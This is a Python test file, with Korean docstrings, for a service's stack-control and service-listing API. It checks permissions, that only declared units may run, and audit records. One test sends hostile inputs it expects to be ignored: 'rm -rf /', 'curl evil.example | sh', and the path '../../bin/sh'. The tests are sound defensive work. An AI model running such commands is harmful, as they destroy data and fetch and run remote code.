"""가시화 명령으로 스택을 세우는 계약 — `/api/stack`(쓰기) · `/api/services`(조회).

implements: AI-B-03 (실행 제어), AI-O-06 (조회·제어 분리), AI-C-19 (물리 명령이 아니다),
            AI-C-05 (선언이 없으면 그 조각만 비활성)
tests: 단위 이름만 받는다 · 선언 밖 이름은 404 · 능력이 없으면 403 · 조회는 바꾸지
       못한다 · 감독자가 없는 배치는 **사유를 낸다** · 읽는 이름과 쓰는 이름이 겹치지 않는다
"""
from __future__ import annotations

import pathlib
import sys

import pytest

from mission_runtime.execution.control import TargetStatus
from mission_runtime.providers.process_control import (
    KIND_PROCESS,
    ProcessControlProvider,
    StackUnit,
)
from mission_runtime.tools.view_service.accounts import PERM_OPERATE_STACK
from mission_runtime.tools.view_service.service import ApiError

_PKG = pathlib.Path(__file__).resolve().parents[1]


class Caller:
    """권한만 들고 있는 호출자. 서비스가 쓰는 것은 `may()` 와 `actor` 뿐이다."""

    def __init__(self, *perms: str, actor: str = "op-1") -> None:
        self.actor = actor
        self._perms = frozenset(perms)

    def may(self, permission: str) -> bool:
        return permission in self._perms


def service_with_stack(tmp_path, *units: StackUnit):
    from mission_runtime.tools.view_service.service import FmsService

    provider = ProcessControlProvider({u.unit_id: u for u in units},
                                      state_dir=tmp_path / "state")
    # 조립만 본다 — 함대·선언 파일을 읽지 않는다(그쪽은 다른 시험의 몫이다).
    return FmsService.__new__(FmsService), provider


def operate(service, provider, body, *, caller=None):
    """`write_payload` 가 하는 일과 **같은 호출**을 한다."""
    service.stack = provider
    return service.operate_stack(
        caller=caller or Caller(PERM_OPERATE_STACK), body=body)


def sleeper(unit_id: str = "sleeper") -> StackUnit:
    return StackUnit(unit_id=unit_id, kind=KIND_PROCESS,
                     argv=(sys.executable, "-c", "import time; time.sleep(30)"))


# --------------------------------------------------------------- 계약의 자리

def test_the_read_name_and_the_write_name_do_not_overlap():
    from integration.fms_view_api import VIEW_ROUTES
    from integration.fms_write_api import WRITE_ROUTES

    assert "/api/services" in VIEW_ROUTES
    assert "/api/stack" in WRITE_ROUTES
    assert not set(VIEW_ROUTES) & set(WRITE_ROUTES)


def test_the_declared_lists_match_the_service_tables():
    """어긋나면 게이트웨이가 **API 를 세우지 않는다** — 조용히 좁은 쪽을 쓰면 기능
    하나가 말없이 사라진다."""
    from integration.fms_view_api import VIEW_ROUTES, _load_console
    from integration.fms_write_api import WRITE_ROUTES

    console = _load_console()
    assert set(VIEW_ROUTES) == set(console._ROUTES_GET)
    assert set(WRITE_ROUTES) == set(console._ROUTES_POST)


def test_operating_the_stack_needs_its_own_permission():
    """물리 명령 권한과 **다른 칸**이다(AI-C-19) — 프로세스를 띄우는 것과 로봇을
    움직이는 것은 같은 권한이 아니다."""
    from mission_runtime.tools.view_service.accounts import (
        PERM_COMMAND,
        ROLE_PERMISSIONS,
    )
    from mission_runtime.tools.view_service.service import _POST_PERMISSIONS

    assert _POST_PERMISSIONS["/api/stack"] == PERM_OPERATE_STACK
    assert PERM_OPERATE_STACK != PERM_COMMAND
    assert PERM_OPERATE_STACK not in ROLE_PERMISSIONS["viewer"]
    assert PERM_OPERATE_STACK in ROLE_PERMISSIONS["operator"]


# --------------------------------------------------------------- 쓰기

def test_a_caller_without_the_permission_is_refused(tmp_path):
    service, provider = service_with_stack(tmp_path, sleeper())
    with pytest.raises(ApiError) as raised:
        operate(service, provider, {"unit_id": "sleeper", "action": "start"},
                caller=Caller("may_view"))
    assert "missing_permission" in raised.value.reason


def test_a_unit_outside_the_declaration_is_refused_before_anything_runs(tmp_path):
    """**이 경로의 경계.** 망에서 오는 것은 이름뿐이고, 선언에 없으면 끝이다."""
    service, provider = service_with_stack(tmp_path, sleeper())
    with pytest.raises(ApiError) as raised:
        operate(service, provider, {"unit_id": "../../bin/sh", "action": "start"})
    assert raised.value.status == 404
    assert raised.value.reason == "unit_not_declared"


def test_a_command_line_in_the_body_is_ignored_because_it_is_never_read(tmp_path):
    """본문에 argv 를 실어 보내도 **읽는 코드가 없다.**"""
    service, provider = service_with_stack(tmp_path, sleeper())
    try:
        result = operate(service, provider, {
            "unit_id": "sleeper", "action": "start",
            "argv": ["rm", "-rf", "/"], "cmd": "curl evil.example | sh"})
        assert result["accepted"] is True
        assert provider.unit("sleeper").argv[0] == sys.executable
    finally:
        provider.request("stop", "sleeper")


def test_an_unknown_action_is_refused(tmp_path):
    service, provider = service_with_stack(tmp_path, sleeper())
    with pytest.raises(ApiError) as raised:
        operate(service, provider, {"unit_id": "sleeper", "action": "deploy"})
    assert raised.value.status == 400


def test_a_missing_unit_id_is_named(tmp_path):
    service, provider = service_with_stack(tmp_path, sleeper())
    with pytest.raises(ApiError) as raised:
        operate(service, provider, {"action": "start"})
    assert raised.value.reason == "unit_id_required"


def test_starting_and_stopping_goes_through_and_records_who_asked(tmp_path):
    service, provider = service_with_stack(tmp_path, sleeper())
    try:
        started = operate(service, provider,
                          {"unit_id": "sleeper", "action": "start"},
                          caller=Caller(PERM_OPERATE_STACK, actor="operator-7"))
        assert started["accepted"] is True and started["status"] == "RUNNING"
        assert started["actor"] == "operator-7"
        assert provider.audit_log[-1].requested_by == "operator-7"

        stopped = operate(service, provider, {"unit_id": "sleeper", "action": "stop"})
        assert stopped["accepted"] is True and stopped["status"] == "STOPPED"
    finally:
        provider.request("stop", "sleeper")


def test_a_refusal_carries_the_reason_token(tmp_path):
    service, provider = service_with_stack(
        tmp_path, StackUnit(unit_id="ghost", kind=KIND_PROCESS,
                            argv=("not-on-this-machine",)))
    result = operate(service, provider, {"unit_id": "ghost", "action": "start"})
    assert result["accepted"] is False
    assert "executable_not_found" in result["reason"]


# --------------------------------------------------------------- 조회

def test_the_view_lists_declared_units_with_their_state(tmp_path):
    service, provider = service_with_stack(tmp_path, sleeper())
    service.stack = provider
    payload = service.services()

    assert payload["configured"] is True and payload["reason"] is None
    assert [row["unit_id"] for row in payload["units"]] == ["sleeper"]
    assert payload["units"][0]["status"] == TargetStatus.STOPPED.value


def test_without_a_declaration_the_view_says_why_rather_than_being_empty(tmp_path):
    """빈 목록만 내면 "띄울 것이 없다" 와 "이 설치는 띄우지 않는다" 가 같아 보인다."""
    from mission_runtime.tools.view_service.service import FmsService

    service = FmsService.__new__(FmsService)
    service.stack = None
    payload = service.services()

    assert payload == {"units": [], "configured": False,
                       "reason": "stack_units_not_declared"}


def test_writing_without_a_declaration_is_refused_with_the_same_reason(tmp_path):
    from mission_runtime.tools.view_service.service import FmsService

    service = FmsService.__new__(FmsService)
    service.stack = None
    with pytest.raises(ApiError) as raised:
        service.operate_stack(caller=Caller(PERM_OPERATE_STACK),
                              body={"unit_id": "x", "action": "start"})
    assert raised.value.status == 409
    assert raised.value.reason == "stack_units_not_declared"


def test_the_view_payload_carries_no_command_line(tmp_path):
    """화면에 argv 를 내보내면 **다음 사람이 그것을 고쳐 보내려 한다.**"""
    service, provider = service_with_stack(tmp_path, sleeper())
    service.stack = provider
    for row in service.services()["units"]:
        assert "argv" not in row and "compose_file" not in row


def test_the_shipped_declaration_can_be_served_through_the_builder(tmp_path):
    """`--stack-units` 를 주면 그 선언이 서비스에 붙는다 — 주지 않으면 비활성이다."""
    from mission_runtime.tools.view_service.service import _stack_provider

    assert _stack_provider(None) is None
    provider = _stack_provider(_PKG / "config" / "stack_units.example.json")
    assert provider is not None
    assert "data-stream-server" in provider.declared()
